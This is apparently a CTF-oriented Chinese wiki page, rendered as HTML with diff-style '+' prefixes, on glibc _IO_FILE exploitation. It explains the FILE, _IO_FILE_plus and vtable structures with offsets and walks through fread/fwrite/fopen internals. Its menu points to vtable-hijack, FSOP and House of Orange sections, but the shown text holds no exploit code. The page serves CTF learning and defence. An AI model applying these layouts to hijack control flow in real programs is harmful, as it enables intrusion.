+    <nav class="md-nav" aria-label="涉及文件流部分函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#fread" class="md-nav__link">
+    fread
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fwrite" class="md-nav__link">
+    fwrite
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fopen" class="md-nav__link">
+    fopen
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#fclose" class="md-nav__link">
+    fclose
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#printfputs" class="md-nav__link">
+    printf/puts
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#vtable" class="md-nav__link">
+    伪造 vtable 劫持程序流程
+  </a>
+  
+    <nav class="md-nav" aria-label="伪造 vtable 劫持程序流程">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    简介
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    原理示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    小结
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    例题
+  </a>
+  
+    <nav class="md-nav" aria-label="例题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2018-hctf-the_end" class="md-nav__link">
+    2018 HCTF the_end
+  </a>
+  
+    <nav class="md-nav" aria-label="2018 HCTF the_end">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fsop" class="md-nav__link">
+    FSOP
+  </a>
+  
+    <nav class="md-nav" aria-label="FSOP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    介绍
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    原理示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    例题
+  </a>
+  
+    <nav class="md-nav" aria-label="例题">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ciscn_2019_n_7" class="md-nav__link">
+    ciscn_2019_n_7
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    漏洞
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#glibc-224" class="md-nav__link">
+    glibc 2.24 利用
+  </a>
+  
+    <nav class="md-nav" aria-label="glibc 2.24 利用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    新增防御机制
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_str_jumps" class="md-nav__link">
+    _IO_str_jumps
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_io_wstr_jumps" class="md-nav__link">
+    _IO_wstr_jumps
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_dl_fini" class="md-nav__link">
+    修改 _dl_fini 函数指针
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#house-of-orange" class="md-nav__link">
+    House of orange
+  </a>
+  
+    <nav class="md-nav" aria-label="House of orange">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    概述
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    使用条件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#hitcon_2016_houseoforange" class="md-nav__link">
+    hitcon_2016_houseoforange
+  </a>
+  
+    <nav class="md-nav" aria-label="hitcon_2016_houseoforange">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    基本情况
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    思路
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exp_1" class="md-nav__link">
+    EXP
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    参考文章
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/IO_FILE/Pwn_IO_FILE.md" title="编辑此页" class="md-content__button md-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
+                  </a>
+                
+                
+                <h1 id="pwn-_io_file">Pwn _IO_FILE<a class="headerlink" href="#pwn-_io_file" title="Permanent link">&para;</a></h1>
+<h2 id="io">IO 结构体知识<a class="headerlink" href="#io" title="Permanent link">&para;</a></h2>
+<h3 id="_io_file">_IO_FILE 结构<a class="headerlink" href="#_io_file" title="Permanent link">&para;</a></h3>
+<p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值——文件描述符（eg:stdin=0;stdout=1)。</p>
+<p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：<strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>。假设现在第一次用 fopen 打开一个文件流，这个文件流的文件描述符就为 3 。默认打开的三个文件流分配 libc data 段。fopen 等文件流控制函数创建的文件流是分配在堆上。</p>
+<p>FILE 结构体定义在 libio.h ：</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">_IO_FILE</span> <span class="p">{</span>
+  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>       <span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
+<span class="cp">#define _IO_file_flags _flags</span>
+
+  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
+  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>   <span class="cm">/* Current read pointer */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>   <span class="cm">/* End of get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>  <span class="cm">/* Start of putback+get area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span> <span class="cm">/* Start of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>  <span class="cm">/* Current put pointer. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>  <span class="cm">/* End of put area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>   <span class="cm">/* Start of reserve area. */</span>
+  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>    <span class="cm">/* End of reserve area. */</span>
+  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
+
+  <span class="k">struct</span> <span class="nc">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
+
+  <span class="k">struct</span> <span class="nc">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
+
+  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
+<span class="cp">#if 0</span><span class="c"></span>
+<span class="c">  int _blksize;</span>
+<span class="cp">#else</span>
+  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
+<span class="cp">#endif</span>
+  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it&#39;s too small.  */</span>
+
+<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp"></span>
+  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
+  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
+  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>
+
+  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
+<span class="cp">#ifdef _IO_USE_OLD_IO_FILE</span>
+<span class="p">};</span>
+</code></pre></div>
+<p><strong>每个文件流都有自己的 FILE 结构体</strong>。我们可以在 libc.so 中找到 stdin\stdout\stderr 等符号，这些符号是指向 FILE 结构的指针，真正结构的符号是</p>
+<div class="highlight"><pre><span></span><code>_IO_2_1_stderr_
+_IO_2_1_stdout_
+_IO_2_1_stdin_
+</code></pre></div>
+<p>在 ida 中搜索 <code>_IO_2_1_stdxxx_</code> 或者 <code>stdxx</code> 这个变量会存储 FILE 结构体地址：</p>
+<p><img alt="image-20201210083553060" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083553.png" /></p>
+<p>gdb 调试中查看结构体内容：</p>
+<p><img alt="image-20201210083345062" src="https://gitee.com/mrskye/Picbed/raw/master/img/20201210083345.png" /></p>
+<p>进程中的 FILE 结构会通过 _chain 域彼此连接形成一个链表（上图可见指向 _IO_2_1_strout ），<strong>链表头部用全局变量 _IO_list_all 表示</strong>，通过这个值我们可以遍历所有的 FILE 结构（FSOP 攻击利用到这个特性）。</p>
+<h3 id="_io_file_plus">_IO_FILE_plus 结构<a class="headerlink" href="#_io_file_plus" title="Permanent link">&para;</a></h3>
+<p>但是事实上 _IO_FILE 结构外包裹着另一种结构 _IO_FILE_plus ，其中包含了一个重要的**指针 vtable 指向了一系列函数指针**。</p>
+<p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span> <span class="nc">_IO_FILE_plus</span>
+<span class="p">{</span>
+    <span class="n">_IO_FILE</span>    <span class="n">file</span><span class="p">;</span>
+    <span class="n">_IO_jump_t</span>   <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>_IO_FILE_plus 结构体&amp;各个偏移，当中 0x0 ~ 0xc4 其实就是 _IO_FILE 结构，最后加上 vtable 指针指向 _IO_jump_t ：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">//p *((struct _IO_FILE_plus*)[地址])</span>
+<span class="mh">0x0</span>   <span class="n">_flags</span>
+<span class="mh">0x8</span>   <span class="n">_IO_read_ptr</span>
+<span class="mh">0x10</span>  <span class="n">_IO_read_end</span>
+<span class="mh">0x18</span>  <span class="n">_IO_read_base</span>
+<span class="mh">0x20</span>  <span class="n">_IO_write_base</span>
+<span class="mh">0x28</span>  <span class="n">_IO_write_ptr</span>
+<span class="mh">0x30</span>  <span class="n">_IO_write_end</span>
+<span class="mh">0x38</span>  <span class="n">_IO_buf_base</span>
+<span class="mh">0x40</span>  <span class="n">_IO_buf_end</span>
+<span class="mh">0x48</span>  <span class="n">_IO_save_base</span>
+<span class="mh">0x50</span>  <span class="n">_IO_backup_base</span>
+<span class="mh">0x58</span>  <span class="n">_IO_save_end</span>
+<span class="mh">0x60</span>  <span class="n">_markers</span>
+<span class="mh">0x68</span>  <span class="n">_chain</span>
+<span class="mh">0x70</span>  <span class="n">_fileno</span>
+<span class="mh">0x74</span>  <span class="n">_flags2</span>
+<span class="mh">0x78</span>  <span class="n">_old_offset</span>
+<span class="mh">0x80</span>  <span class="n">_cur_column</span>
+<span class="mh">0x82</span>  <span class="n">_vtable_offset</span>
+<span class="mh">0x83</span>  <span class="n">_shortbuf</span>
+<span class="mh">0x88</span>  <span class="n">_lock</span>
+<span class="c1">//IO_FILE_complete</span>
+<span class="mh">0x90</span>  <span class="n">_offset</span>
+<span class="mh">0x98</span>  <span class="n">_codecvt</span>
+<span class="mh">0xa0</span>  <span class="n">_wide_data</span>
+<span class="mh">0xa8</span>  <span class="n">_freeres_list</span>
+<span class="mh">0xb0</span>  <span class="n">_freeres_buf</span>
+<span class="mh">0xb8</span>  <span class="n">__pad5</span>
+<span class="mh">0xc0</span>  <span class="n">_mode</span>
+<span class="mh">0xc4</span>  <span class="n">_unused2</span>
+<span class="mh">0xd8</span>  <span class="n">vtable</span>
+</code></pre></div>
+<h3 id="_io_jump_t">_IO_jump_t 结构<a class="headerlink" href="#_io_jump_t" title="Permanent link">&para;</a></h3>
+<p>vtable 是 _IO_jump_t 类型的指针，指向的 _IO_jump_t 结构体中保存了一堆函数指针，这有点像 c++ 的虚函数结构体，在后面我们会看到在一系列标准 IO 函数中会调用这里面的函数指针。</p>
+<p>在 ida 中可以找 <code>_IO_2_1_stderr_</code> 结构体后面的 <code>dq offset _IO_file_jumps</code> 跳转到结构体。或者直接搜索 <code>_IO_file_jumps</code> ，vtable 实际指向的结构体名字。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">//p *((struct _IO_jump_t*)[地址])</span>
+<span class="kt">void</span> <span class="o">*</span> <span class="n">funcs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
+    <span class="cm">/* showmany */</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
+    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
+<span class="cp">#if 0</span><span class="c"></span>
+<span class="c">    get_column;</span>
+<span class="c">    set_column;</span>
+<span class="cp">#endif</span>
+<span class="p">};</span>
+</code></pre></div>
+<h3 id="_1">小结<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>stdin、stdout、stderr</strong> 文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上</li>
+<li><strong>stdin、stdout、stderr，分别对应文件描述符：0、1、2</strong>，开启新的文件流文件描述符从 3 开始递增</li>
+<li>每个文件流都单独的 _IO_FILE  、_IO_FILE_plus 结构体，<code>_IO_jump_t   *vtable</code>只有一个各个文件流公用</li>
+<li>指针 vtable 指向了一系列函数指针，各种 IO 操作均是通过 vtable 指向各个具体函数实现功能</li>
+<li>文件流通过 _chain 构成链表，<strong>链表头部用全局变量 _IO_list_all 表示</strong></li>
+<li>ida 中通过搜索文件流名可以找到 _IO_FILE  、_IO_FILE_plus ，根据偏移（结构体最后位置）找到 vtable （eg:<em>IO_2_1_stderr</em>)</li>
+</ul>
+<h2 id="_2">涉及文件流部分函数<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h3 id="fread">fread<a class="headerlink" href="#fread" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>涉及源码文件：</p>
+<div class="highlight"><pre><span></span><code><span class="n">libio</span><span class="o">/</span><span class="n">iofread</span><span class="p">.</span><span class="n">c</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">genops</span><span class="p">.</span><span class="n">c</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">libioP</span><span class="p">.</span><span class="n">h</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">fileops</span><span class="p">.</span><span class="n">c</span>
+</code></pre></div>
+</blockquote>
+<p>fread 是标准 IO 库函数，作用是从文件流中读数据，函数原型如下</p>
+<div class="highlight"><pre><span></span><code><span class="kt">size_t</span> <span class="nf">fread</span> <span class="p">(</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">)</span> <span class="p">;</span>
+</code></pre></div>
+<ul>
+<li>buffer 存放读取数据的缓冲区。</li>
+<li>size：指定每个记录的长度。</li>
+<li>count： 指定记录的个数。</li>
+<li>stream：目标文件流。</li>
+<li>返回值：返回读取到数据缓冲区中的记录个数</li>
+</ul>
+<p>fread 的代码位于 / libio/iofread.c 中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn 中。</p>
+<div class="highlight"><pre><span></span><code><span class="n">_IO_size_t</span>
+<span class="nf">_IO_fread</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">count</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span>
+     <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+     <span class="n">_IO_size_t</span> <span class="n">size</span><span class="p">;</span>
+     <span class="n">_IO_size_t</span> <span class="n">count</span><span class="p">;</span>
+     <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+  <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">_IO_sgetn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes_requested</span><span class="p">);</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>在_IO_sgetn 函数中会调用_IO_XSGETN，而_IO_XSGETN 是_IO_FILE_plus.vtable 中的函数指针，在*调用这个函数时会首先取出 vtable 中的指针然后再进行调用*。</p>
+<div class="highlight"><pre><span></span><code><span class="n">_IO_size_t</span>
+<span class="nf">_IO_sgetn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+     <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+     <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+     <span class="n">_IO_size_t</span> <span class="n">n</span><span class="p">;</span>
+<span class="p">{</span>
+  <span class="k">return</span> <span class="nf">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>在默认情况下函数指针是指向_IO_file_xsgetn 函数的，</p>
+<div class="highlight"><pre><span></span><code>  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
+          <span class="o">&amp;&amp;</span> <span class="n">want</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">))</span>
+        <span class="p">{</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">__underflow</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+        <span class="k">break</span><span class="p">;</span>
+
+          <span class="k">continue</span><span class="p">;</span>
+        <span class="p">}</span>
+</code></pre></div>
+<h3 id="fwrite">fwrite<a class="headerlink" href="#fwrite" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>涉及源码文件：</p>
+<div class="highlight"><pre><span></span><code><span class="n">libio</span><span class="o">/</span><span class="n">iofwrite</span><span class="p">.</span><span class="n">c</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">libioP</span><span class="p">.</span><span class="n">h</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">fileops</span><span class="p">.</span><span class="n">c</span>
+</code></pre></div>
+</blockquote>
+<p>fwrite 同样是标准 IO 库函数，作用是向文件流写入数据，函数原型如下</p>
+<div class="highlight"><pre><span></span><code><span class="kt">size_t</span> <span class="nf">fwrite</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="kt">FILE</span><span class="o">*</span> <span class="n">stream</span><span class="p">);</span>
+</code></pre></div>
+<ul>
+<li>buffer: 是一个指针，对 fwrite 来说，是要写入数据的地址;</li>
+<li>size: 要写入内容的单字节数;</li>
+<li>count: 要进行写入 size 字节的数据项的个数;</li>
+<li>stream: 目标文件指针;</li>
+<li>返回值：实际写入的数据项个数 count。</li>
+</ul>
+<p>fwrite 的代码位于 / libio/iofwrite.c 中，函数名为_IO_fwrite。 在_IO_fwrite 中主要是调用_IO_XSPUTN 来实现写入的功能。</p>
+<p>根据前面对_IO_FILE_plus 的介绍，可知_IO_XSPUTN 位于_IO_FILE_plus 的 vtable 中，调用这个函数需要首先取出 vtable 中的指针，再跳过去进行调用。</p>
+<div class="highlight"><pre><span></span><code><span class="n">written</span> <span class="o">=</span> <span class="n">_IO_sputn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">,</span> <span class="n">request</span><span class="p">);</span>
+</code></pre></div>
+<p>在_IO_XSPUTN 对应的默认函数_IO_new_file_xsputn 中会调用同样位于 vtable 中的_IO_OVERFLOW</p>
+<div class="highlight"><pre><span></span><code> <span class="cm">/* Next flush the (full) buffer. */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+</code></pre></div>
+<p>_IO_OVERFLOW 默认对应的函数是_IO_new_file_overflow</p>
+<div class="highlight"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">_IO_do_write</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">,</span>
+             <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">-</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">==</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="p">)</span> <span class="cm">/* Buffer is really full */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">_IO_do_flush</span> <span class="p">(</span><span class="n">f</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+</code></pre></div>
+<p>在_IO_new_file_overflow 内部最终会调用系统接口 write 函数</p>
+<h3 id="fopen">fopen<a class="headerlink" href="#fopen" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p>涉及源码文件：</p>
+<div class="highlight"><pre><span></span><code><span class="n">libio</span><span class="o">/</span><span class="n">iofopen</span><span class="p">.</span><span class="n">c</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">fileops</span><span class="p">.</span><span class="n">c</span>
+<span class="n">libio</span><span class="o">/</span><span class="n">genops</span><span class="p">.</span><span class="n">c</span>
+</code></pre></div>
+</blockquote>
+<p>fopen 在标准 IO 库中用于打开文件，函数原型如下</p>
+<div class="highlight"><pre><span></span><code><span class="kt">FILE</span> <span class="o">*</span><span class="nf">fopen</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="o">*</span><span class="n">type</span><span class="p">);</span>
+</code></pre></div>
+<ul>
+<li>filename: 目标文件的路径</li>
+<li>type: 打开方式的类型</li>
+<li>返回值: 返回一个文件指针</li>
+</ul>
+<p>在 fopen 内部会创建 FILE 结构并进行一些初始化操作，下面来看一下这个过程</p>
+<p>首先在 fopen 对应的函数__fopen_internal 内部会调用 malloc 函数，分配 FILE 结构的空间。因此我们可以获知 FILE 结构是存储在堆上的</p>
+<div class="highlight"><pre><span></span><code><span class="o">*</span><span class="n">new_f</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">locked_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">locked_FILE</span><span class="p">));</span>
